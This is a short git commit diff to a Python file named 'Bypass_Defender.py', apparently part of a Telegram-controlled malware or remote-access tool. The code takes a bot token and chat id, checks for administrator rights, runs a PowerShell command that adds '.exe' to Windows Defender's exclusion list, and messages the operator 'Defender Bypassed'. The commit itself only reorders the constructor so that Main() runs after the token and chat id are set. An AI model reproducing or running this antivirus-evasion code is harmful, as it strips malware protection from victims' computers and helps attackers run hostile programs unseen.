05b075bc940eea3f64fc17353f3446ce3b7baeac
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-06-01 12:12:24 +0200

    Update Bypass_Defender.py

--- Bypass_Defender.py
+++ Bypass_Defender.py
@@ -2,11 +2,12 @@ import os, ctypes, requests , getpass, sys
 class Bypass_Defender():
 	def __init__(self,_):
 		self._ = _
-		self.Main()
 
 		self.token = sys.argv[1]
 		self.chat_id = sys.argv[2]
+		self.Main()
 
+	def Main(self):
 		if ctypes.windll.shell32.IsUserAnAdmin() == 1:
 			os.system("powershell.exe -c \"Add-MpPreference -ExclusionExtension '.exe';\"")
 			self._.Send_Message("✔ Defender Bypassed.")
